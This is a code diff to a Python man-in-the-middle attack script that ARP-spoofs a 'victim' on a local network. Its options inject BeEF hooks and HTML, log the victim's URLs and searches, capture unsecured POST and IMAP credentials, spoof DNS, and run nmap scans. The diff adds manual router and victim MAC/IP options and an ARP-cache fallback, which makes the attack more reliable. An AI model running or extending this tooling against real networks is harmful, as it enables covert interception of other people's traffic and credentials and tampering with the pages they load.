@@ -44,6 +44,7 @@ parser.add_argument("-b", "--beef", help="Inject a BeEF hook URL. Example usage:
 parser.add_argument("-c", "--code", help="Inject arbitrary html. Example usage (include quotes): -c '<title>New title</title>'")
 parser.add_argument("-u", "--urlspy", help="Show all URLs and search terms the victim visits or enters minus URLs that end in .jpg, .png, .gif, .css, and .js to make the output much friendlier. Also truncates URLs at 150 characters. Use -v to print all URLs and without truncation.", action="store_true")
 parser.add_argument("-ip", "--ipaddress", help="Enter IP address of victim and skip the arp ping at the beginning which would give you a list of possible targets. Usage: -ip <victim IP>")
+parser.add_argument("-vmac", "--victimmac", help="Set the victim MAC; by default the script will attempt a few different ways of getting this so this option hopefully won't be necessary")
 parser.add_argument("-d", "--driftnet", help="Open an xterm window with driftnet.", action="store_true")
 parser.add_argument("-v", "--verboseURL", help="Shows all URLs the victim visits but doesn't limit the URL to 150 characters like -u does.", action="store_true")
 parser.add_argument("-dns", "--dnsspoof", help="Spoof DNS responses of a specific domain. Enter domain after this argument. An argument like [facebook.com] will match all subdomains of facebook.com")
@@ -52,6 +53,8 @@ parser.add_argument("-p", "--post", help="Print unsecured HTTP POST loads, IMAP/
 parser.add_argument("-na", "--nmapaggressive", help="Aggressively scan the target for open ports and services in the background. Output to ip.add.re.ss.log.txt where ip.add.re.ss is the victim's IP.", action="store_true")
 parser.add_argument("-n", "--nmap", help="Scan the target for open ports prior to starting to sniffing their packets.", action="store_true")
 parser.add_argument("-i", "--interface", help="Choose the interface to use. Default is the first one that shows up in `ip route`.")
+parser.add_argument("-rip", "--routerip", help="Set the router IP; by default the script with attempt a few different ways of getting this so this option hopefully won't be necessary")
+parser.add_argument("-rmac", "--routermac", help="Set the router MAC; by default the script with attempt a few different ways of getting this so this option hopefully won't be necessary")
 parser.add_argument("-pcap", "--pcap", help="Parse through a pcap file")
 args = parser.parse_args()
 
@@ -906,7 +909,10 @@ def main():
 	ipr = Popen(['/sbin/ip', 'route'], stdout=PIPE, stderr=DN)
 	ipr = ipr.communicate()[0]
 	ipr = repr(ipr).split(' ')
-	routerIP = ipr[2]
+	if args.routerip:
+		routerIP = args.routerip
+	else:
+		routerIP = ipr[2]
 	IPprefix = ipr[8][2:]
 	if args.interface:
 		interface = args.interface
@@ -956,18 +962,40 @@ def main():
 
 	# Print the vars
 	print_vars(DHCPsrvr, dnsIP, local_domain, routerIP, victimIP)
-	try:
-		routerMAC = Spoof().originalMAC(routerIP)
+	if args.routermac:
+		routerMAC = args.routermac
 		print "[*] Router MAC: " + routerMAC
 		logger.write("[*] Router MAC: "+routerMAC+'\n')
-	except:
-		exit("[-] Could not get router MAC address")
-	try:
-		victimMAC = Spoof().originalMAC(victimIP)
+	else:
+		try:
+			routerMAC = Spoof().originalMAC(routerIP)
+			print "[*] Router MAC: " + routerMAC
+			logger.write("[*] Router MAC: "+routerMAC+'\n')
+		except:
+			try:
+				print "[-] Router did not respond to ARP request for MAC, attempting to pull the MAC from the ARP cache"
+				arpcache = Popen(['/usr/sbin/arp', '-n'], stdout=PIPE, stderr=DN)
+				split_lines = arpcache.communicate()[0].splitlines()
+				print split_lines[1],'\n'
+				arpoutput = split_lines[1].split()
+				print arpoutput,'\n'
+				routerMAC = arpoutput[2]
+				print "[*] Router MAC: " + routerMAC
+				logger.write("[*] Router MAC: "+routerMAC+'\n')
+			except:
+				sys.exit("[-] [arp -n] failed to give accurate router MAC address")
+
+	if args.victimmac:
+		victimMAC = args.victimmac
 		print "[*] Victim MAC: " + victimMAC
-		logger.write("[*] Victim MAC: "+routerMAC+'\n')
-	except:
-		exit("[-] Could not get victim MAC address")
+		logger.write("[*] Victim MAC: "+victimMAC+'\n')
+	else:
+		try:
+			victimMAC = Spoof().originalMAC(victimIP)
+			print "[*] Victim MAC: " + victimMAC
+			logger.write("[*] Victim MAC: "+victimMAC+'\n')
+		except:
+			exit("[-] Could not get victim MAC address; try the -vmac [xx:xx:xx:xx:xx:xx] option if you know the victim's MAC address")
 	if dnsIP != routerIP:
 		try:
 			dnsMAC = Spoof().originalMAC(dnsIP)
@@ -984,14 +1012,14 @@ def main():
 	if args.nmap:
 		print "\n[*] Running [nmap -T4 -O "+victimIP+"]"
 		try:
-			nmap = Popen(['/usr/bin/nmap', '-T4', '-O', victimIP], stdout=PIPE, stderr=DN)
-			nmap = nmap.communicate()[0]
-			nmap = nmap.splitlines()[3:-4]
+			nmap = Popen(['/usr/bin/nmap', '-T4', '-O', '-e', interface, victimIP], stdout=PIPE, stderr=DN)
+			nmap = nmap.communicate()[0].splitlines()
+			for x in nmap:
+				if x != '':
+					print '[+]',x
+					logger.write('[+] '+x+'\n')
 		except:
 			print '[-] Nmap port and OS scan failed, is it installed?'
-		for x in nmap:
-			print '[+]',x
-			logger.write('[+] '+x+'\n')
 
 	print ''
 
